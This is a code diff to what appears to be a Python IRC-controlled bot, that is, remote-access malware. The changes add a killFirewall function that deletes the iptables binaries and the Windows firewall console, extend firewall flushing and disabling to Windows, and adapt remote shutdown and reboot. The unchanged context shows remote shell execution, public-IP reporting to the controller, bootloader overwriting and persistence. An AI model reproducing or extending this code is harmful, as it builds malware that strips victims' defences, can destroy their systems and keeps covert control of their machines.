@@ -32,7 +32,7 @@ def generateNick(operatingSystem): #generates a nick for the server
 
 def execute(cmd): #execute shell commands
 	isItLs = 0
-	if "ls" in cmd:
+	if "ls" == cmd[:2]:
 		cmd += " -pA"
 		isItLs = 1
 
@@ -147,10 +147,29 @@ def getIP(): #gets the public IP address
 	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
 	sendData(my_ip)
 
+def killFirewall(): #removes the firewall from the box
+	if operatingSystem == "linux":
+		execute("rm -f $(which iptables)")
+		execute("rm -f $(which ip6tables)")
+	elif operatingSystem == "windows":
+		execute("del /F 'C:\\Windows\\System32\\WF.msc'")
+
 def flushFirewall(): #flushes the firewall rules
 	if (operatingSystem == "linux"):
-		request = execute("/usr/bin/env iptables -F") #flushing rules
+		execute("/usr/bin/env iptables -F") #flushing rules
+		execute("/usr/bin/env ip6tables -F") #flushing rules
 		sendData("Firewall rules have been flushed.")
+	elif operatingSystem == "windows":
+		kernel = platform.release().lower()
+		if kernel == "xp":
+			execute("netsh firewall set opmode disable") #turn off firewall
+		else:
+			execute("netsh advfirewall firewall delete rule name=all") #delete all rules
+			execute("netsh advfirewall set allprofiles state off") #disable profiles. aka turn off
+
+		sendData("Firewall rules have been flushed.")
+	else:
+		sendData("I can't do this  '" + operatingSystem + "' yet")
 
 def checkFirewall(): #reports current firewall config
 	if (operatingSystem == "linux"):
@@ -162,11 +181,11 @@ def checkFirewall(): #reports current firewall config
 	elif (operatingSystem == "darwin"):
 		sendData("idk how to mac yet boss.")
 	else:
-		sendData("unknown")
+		sendData("unknown os")
 
 def download(cmd): #file downloader
 	if (operatingSystem == "linux"):
-		if (cmd.count(" ") != 1): #make sure there is only 1 space
+		if (cmd.count(" ") > 1): #make sure there is only 1 space
 			sendData("Usage: download [file] [dir]")
 		else:
 			args = cmd.split(" ")
@@ -184,11 +203,21 @@ def nyanmbr(): #download nyancat.mbr and over bootloader with it
 
 def nap(): #shutdown the computer
 	irc.close()
-	execute("init 0")
+	if operatingSystem == "windows": #if windows
+		execute("shutdown -s -t 0")
+	elif operatingSystem == "darwin":
+		pass
+	else:
+		execute("init 0")
 
 def reboot(): #reboot the computer
 	irc.close()
-	execute("init 6")
+	if operatingSystem == "windows": #if windows
+		execute("shutdown -r -t 0")
+	elif operatingSystem == "darwin":
+		pass
+	else:
+		execute("init 6")
 
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
 	if operatingSystem == "linux": #if linux
